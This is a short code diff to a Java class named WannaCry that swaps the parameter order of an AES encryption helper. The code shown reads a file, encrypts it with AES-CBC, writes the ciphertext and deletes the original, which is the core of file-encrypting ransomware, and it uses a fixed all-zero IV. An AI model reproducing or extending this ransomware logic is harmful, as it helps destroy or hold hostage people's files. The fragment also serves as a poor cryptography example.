@@ -34,7 +34,7 @@ public class WannaCry {
             SecretKey aesKey = generateAESKey();
 
             byte[] rawText = readBytesFromFile(INPUT_FILE);
-            byte[] encryptedText = encryptWithAES(aesKey, rawText);
+            byte[] encryptedText = encryptWithAES(rawText, aesKey);
             writeBytesToFile(encryptedText, ENCRYPTED_FILE);
             deleteFile(INPUT_FILE);
 
@@ -66,7 +66,7 @@ public class WannaCry {
         return keyGenerator.generateKey();
     }
 
-    private static byte[] encryptWithAES(SecretKey aesKey, byte[] rawText) throws Exception {
+    private static byte[] encryptWithAES(byte[] rawText, SecretKey aesKey) throws Exception {
         Cipher aesInstance = Cipher.getInstance("AES/CBC/PKCS5Padding");
         aesInstance.init(Cipher.ENCRYPT_MODE, aesKey, new IvParameterSpec(new byte[16]));
         return aesInstance.doFinal(rawText);
